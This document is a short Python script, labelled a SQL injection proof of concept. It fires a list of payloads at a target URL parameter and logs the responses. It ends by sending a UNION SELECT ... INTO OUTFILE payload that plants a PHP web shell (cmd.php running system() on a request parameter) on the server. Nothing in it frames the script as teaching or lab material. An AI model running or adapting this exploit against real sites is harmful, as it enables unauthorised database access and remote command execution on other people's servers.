#!/usr/bin/env python3.11
import requests
import time
import argparse

def exploit(url, param, payload):
    full_url = f"{url}?{param}{payload}"
    print(f"[+] Testing {payload.strip()} on {url}?{param}")
    
    try:
        start = time.time()
        response = requests.get(full_url)
        end = time.time()

        response_time = end - start
        content_length = len(response.content)
        status_code = response.status_code
        text = response.text[:500]

        print(f"[+] Status code: {status_code}")
        print(f"[+] Content length: {content_length} bytes")
        print(f"[+] Response time: {response_time:.2f} seconds\n")
        
        with open("output.txt", "a") as theoutput:
            theoutput.write(f"Status code: {status_code}\n")
            theoutput.write(f"URL: {full_url}\n")
            theoutput.write(f"Content Length: {content_length} bytes\n")
            theoutput.write(f"Response time: {response_time:.2f} seconds\n")
            theoutput.write(f"Payload used: {payload}\n\n")
            theoutput.write(f"Text: {text}\n\n")

    except requests.RequestException as e:
        print(f"[-] Error occurred: {e}")
        with open("error.log", "a") as thelog:
            thelog.write(str(e) + "\n")

def main():
    parser = argparse.ArgumentParser(description="SQL Injection PoC")
    parser.add_argument("url", help="Vulnerable URL (e.g. https://example.com/vulnerable_uri)")
    parser.add_argument("payloads", default="payloads.txt", help="File containing payloads")
    parser.add_argument("--param", default="?id=2", help="Parameter to test (default: ?id=2)")
    args = parser.parse_args()

    url = args.url
    if not url.startswith("http"):
        url = f"https://{url}"

    payloads = []
    with open(args.payloads, "r") as thepayloads:
        for line in thepayloads:
            payloads.append(line.strip())

    for payload in payloads:
        exploit(url, args.param, payload)

    print("[+] Uploading shell to server...\n")
    payload = "' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile './cmd.php' #"
    exploit(url, args.param, payload)

if __name__ == "__main__":
    main()
